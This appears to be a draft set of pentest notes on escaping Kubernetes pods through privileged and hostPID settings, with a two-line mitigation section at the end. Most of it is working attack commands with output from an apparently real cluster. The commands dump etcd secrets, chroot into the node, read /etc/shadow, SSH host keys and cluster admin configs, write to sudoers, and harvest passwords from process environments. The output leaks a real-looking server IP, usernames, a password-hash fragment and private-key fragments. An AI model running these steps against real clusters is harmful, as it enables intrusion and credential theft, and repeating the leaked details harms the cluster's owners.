# First What a Hacker Would Do

TODO: picture with possible attacks.


## Getting Unauthorized Shell to the Node

https://github.com/BishopFox/badPods/


### 1. pod privileged

From https://kubernetes.io/docs/concepts/policy/pod-security-policy/#privileged:

> a "privileged" container is given access to all devices on the host. This allows the container nearly all the same access as processes running on the host. This is useful for containers that want to use linux capabilities like manipulating the network stack and accessing devices.



```
$ k create ns priv
$ k -n priv apply -f pod-privileged.yaml
$ k -n priv exec -it pod-privileged -- bash
```

Can read all node's devices:
- lsblk
- ls /dev
- fdisk -l
- ...


```
$ apt-get update && apt-get install less binutils
```

```
$ fdisk -l
$ mount /dev/sda1 /mnt
$ strings /mnt/var/lib/etcd/member/snap/db | less
```

Print all etcd secrets:
```
$ db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```

Find kubectonfig:
```
$ find /mnt -name kubeconfig
$ find /mnt -name .kube
$ grep -R "current-context" /mnt/home/
$ grep -R "current-context" /mnt/root/
$ grep -R "current-context" /mnt/
```

```
root@pod-privileged:/# mount /dev/sda1 /mnt

root@pod-privileged:/# chroot /mnt

sh-4.2# bash
```

Basically, now kubectl already works:
```
[root@pod-privileged /artem]# kubectl config view
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: DATA+OMITTED
    server: https://188.2***4:6443
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
    user: kubernetes-admin
  name: kubernetes-admin@kubernetes
current-context: kubernetes-admin@kubernetes
kind: Config
preferences: {}
users:
- name: kubernetes-admin
  user:
    client-certificate-data: REDACTED
    client-key-data: REDACTED
```

Node's users:
```
[root@pod-privileged /]# cat /etc/shadow
root:$6$auLWtuo4$P5KzOLLAYk2LuEk7CAjs0mVURNXFV***fApzm58Htlgg.bLH0g.3U0guXE/Gj6Q7faQJf0:18907:0:99999:7:::
bin:*:17110:0:99999:7:::
...
```

Ansible config:
```
[root@pod-privileged /]# cat /srv/southbridge/etc/sb-iptables-base.conf
# THIS FILE IS MANAGED BY ANSIBLE, ALL CHANGES WILL BE LOST

# zabbix.southbridge.ru
136.24...
```

Users' data:
```
[root@pod-privileged /]# tree /home -a
/home
├── a.likha****v
│   ├── .bash_logout
│   ├── .bash_profile
│   ├── .bashrc
│   └── .ssh
│       └── authorized_keys
├── a.mukhame***v
│   ├── .bash_logout
...
```

SSH config?
```
[root@pod-privileged /]# cat /etc/ssh/ssh_host_ed25519_key
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAKmjHIiX0dEjs7ycmfA9b3EK/w/GNkBcjFLJBWx0AOuwAAAJB9zPzZfcz8
...

[root@pod-privileged /]# cat /etc/ssh/sshd_config
###################################
# sshd config from southbridge.io #
###################################

AddressFamily inet
...

HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
...
```

Can't read processes:
```
[root@pod-privileged /]# ps aux
Error, do this: mount -t proc proc /proc

[root@pod-privileged /]# ls /proc
total 8
drwxr-xr-x   2 root root 4096 Sep 12  2017 ./
drwxr-xr-x. 18 root root 4096 Oct  7 11:09 ../
```

K8s calico config and cert:
```
[root@pod-privileged /]# cat /etc/cni/net.d/10-calico.conflist
{
  "name": "k8s-pod-network",
  "cniVersion": "0.3.1",
  "plugins": [
    {
      "type": "calico",
      "log_level": "info",
...

[root@pod-privileged /]# cat /etc/cni/net.d/calico-kubeconfig
# Kubeconfig file for Calico CNI plugin.
apiVersion: v1
kind: Config
clusters:
- name: local
  cluster:
    server: https://[10.96***.1]:443
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMvakNDQWVhZ0F3SUJBZ0lCQURBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwcmRXSmwKY201bGRHVnpNQjRYRFRJeE1UQXdOekUwTVRVek5Gb1hEVE14TVRBd05URTBNVFV6TkZvd0ZURVRNQkVHQTFVRQpBeE1LYTNWaVpYSnVaWFJsY3pDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTWdiCmNzenNEakdFT29FR0J4TUVVeTdwQ2dSeUhNUjRBRjVraUdPVGN6V1dXdlpsalNjeE9sNTdOZForcTlnR05paGsKMjRnYVNObkVpaGhRUXBPS0N1blY0UDBGV2RvbzNRMTBRaW1wU0piR0FNSzVIY0lvc0NlRTFDUm1FQzM4WmtrMgpSL2dINWtLNHVlaStkaDRYUGkrQnd0bEVlbElxOU55UTViTDZaYUhQMHhTbGdVZlRselQzMG9GaFBLdFUrSHdLCnJIa3Rva0s4NGxPWXhtRndVYXZuckJVTkNUbGlMSEVSRWFveU9TNGJ5WTRkRTh3SUgvQ1R5R0xLM1VPNllNUGoKeFRoM1ZZWmdtY05TZWFBZmQySHBMT1NpVUE1bkZUQ3FrRm5QL1dNa3drWXNLaGtVbkpCckg5bUxEMmVIU0x2WQpyK2MyQVVJdTl0Q2ZKS3ZxaFJVQ0F3RUFBYU5aTUZjd0RnWURWUjBQQVFIL0JBUURBZ0trTUE4R0ExVWRFd0VCCi93UUZNQU1CQWY4d0hRWURWUjB...
...
```

K8s node's config:
```
[root@pod-privileged /]# tree /etc/kubernetes/
/etc/kubernetes/
├── admin.conf
├── controller-manager.conf
├── kubelet.conf
├── manifests
│   ├── etcd.yaml
│   ├── kube-apiserver.yaml
│   ├── kube-controller-manager.yaml
│   └── kube-scheduler.yaml
├── pki
│   ├── apiserver.crt
│   ├── apiserver-etcd-client.crt
│   ├── apiserver-etcd-client.key
│   ├── apiserver.key
│   ├── apiserver-kubelet-client.crt
│   ├── apiserver-kubelet-client.key
│   ├── ca.crt
│   ├── ca.key
│   ├── etcd
│   │   ├── ca.crt
│   │   ├── ca.key
│   │   ├── healthcheck-client.crt
│   │   ├── healthcheck-client.key
│   │   ├── peer.crt
│   │   ├── peer.key
│   │   ├── server.crt
│   │   └── server.key
│   ├── front-proxy-ca.crt
│   ├── front-proxy-ca.key
│   ├── front-proxy-client.crt
│   ├── front-proxy-client.key
│   ├── sa.key
│   └── sa.pub
└── scheduler.conf
```

And `/etc/kubernetes/admin.conf` contains admin's cluster configuration.

Or as `kube-controller-manager`:
```
[root@pod-privileged /artem]# cp /etc/kubernetes/controller-manager.conf .kube/conf
[root@pod-privileged /artem]# export KUBECONFIG=`pwd`/.kube/conf
[root@pod-privileged /artem]# kubectl config view
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: DATA+OMITTED
    server: https://188.2***:6443
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
    user: system:kube-controller-manager
  name: system:kube-controller-manager@kubernetes
current-context: system:kube-controller-manager@kubernetes
kind: Config
preferences: {}
users:
- name: system:kube-controller-manager
  user:
    client-certificate-data: REDACTED
    client-key-data: REDACTED
```

Network:
```
[root@pod-privileged /artem]# ifconfig
Warning: cannot open /proc/net/dev (No such file or directory). Limited output.
Warning: cannot open /proc/net/dev (No such file or directory). Limited output.
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1480
        inet 10.244*** netmask 255.255.255.255  broadcast 10.244.***
        ether 96:1e:9a:***  txqueuelen 0  (Ethernet)

Warning: cannot open /proc/net/dev (No such file or directory). Limited output.
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)



[root@pod-privileged /artem]# cat /etc/networks
default 0.0.0.0
loopback 127.0.0.0
link-local 169.254.0.0
```

Sudoers is writeable!
```
[root@pod-privileged /artem]# echo "  " >> /etc/sudoers
```

Yum doesn't work -- wrong command?
```
[root@pod-privileged /artem]# yum install docker
error: Failed to initialize NSS library
There was a problem importing one of the Python modules
required to run yum. The error leading to this problem was:

   cannot import name ts

Please install a package which provides this module, or
verify that the module is installed correctly.

It's possible that the above module doesn't match the
current version of Python, which is:
2.7.5 (default, Nov 16 2020, 22:23:17)
[GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]

If you cannot solve this problem yourself, please go to
the yum faq at:
  http://yum.baseurl.org/wiki/Faq
```

Privileged pod can't read node's processes:
```
$ ls /host/proc
<empty>
```




### 2. pod hostpid

Pod can see all the processes running on the node.

```
$ fdisk -l
<empty>
```

You [can](https://github.com/BishopFox/badPods/tree/main/manifests/hostpid):

- *View processes on the host*
```
$ ps aux | grep kubelet
root     12272  4.9  2.3 1177068 381128 ?      Ssl  Oct07  75:23 kube-apiserver --advertise-address=188.246.229.4 --allow-privileged=true --authorization-mode=Node,RBAC --client-ca-file=/etc/kubernetes/pki/ca.crt --enable-admission-plugins=NodeRestriction --enable-bootstrap-token-auth=true --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key --etcd-servers=https://127.0.0.1:2379 --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key --requestheader-allowed-names=front-proxy-client --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt --requestheader-extra-headers-prefix=X-Remote-Extra- --requestheader-group-headers=X-Remote-Group --requestheader-username-headers=X-Remote-User --secure-port=6443 --service-account-issuer=https://kubernetes.default.svc.cluster.local --service-account-key-file=/etc/kubernetes/pki/sa.pub --service-account-signing-key-file=/etc/kubernetes/pki/sa.key --service-cluster-ip-range=10.96.0.0/12 --tls-cert-file=/etc/kubernetes/pki/apiserver.crt --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
root     12365  2.1  1.0 1807888 168864 ?      Ssl  Oct07  32:47 /usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml --container-runtime=remote --container-runtime-endpoint=/run/containerd/containerd.sock --pod-infra-container-image=k8s.gcr.io/pause:3.5
root     23692  0.0  0.0   3436   736 pts/0    S+   15:37   0:00 grep --color=auto kubelet
```

On local host, run another pod:
```
$  k -n mock-payload get po  # should see the secrets mounted to frontend pods
```


- *View the environment variables for each pod on the host (but not the host itself)*:

> TODO: too many permission denied! can't see the secret

```
$ for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1  $e; done > envs.txt
...
$ grep PASSWORD envs.txt
```


- *View the file descriptors for each pod on the host*:




- View the file descriptors for each pod on the host - With hostPID: true, you can read the /proc/[PID]/fd[X] for each process running on the host, including all of the processes running in pods. Some of these allow you to read files that are opened within pods.
- Look for passwords, tokens, keys, etc. – If you are lucky, you will find credentials and you’ll be able to use them to escalate privileges within the cluster, to escalate privileges services supported by the cluster, or to escalate privileges services that cluster-hosted applications are communicating with. It is a long shot, but you might find a Kubernetes service account token or some other authentication material that will allow you to access other namespaces and eventually escalate all the way up to cluster admin.
Kill processes – You can also kill any process on the node (presenting a denial-of-service risk), but I would advise against it on a penetration test!



### 3. pod hostpath
### 4. pod hostipc
### 5. pod hostnetwork

(+root в контейнере)



Note: Luksa plugin https://github.com/luksa/kubectl-plugins/blob/master/kubectl-ssh


## Mitigation
1. PSP (deprecated)
2. Admission Controllers
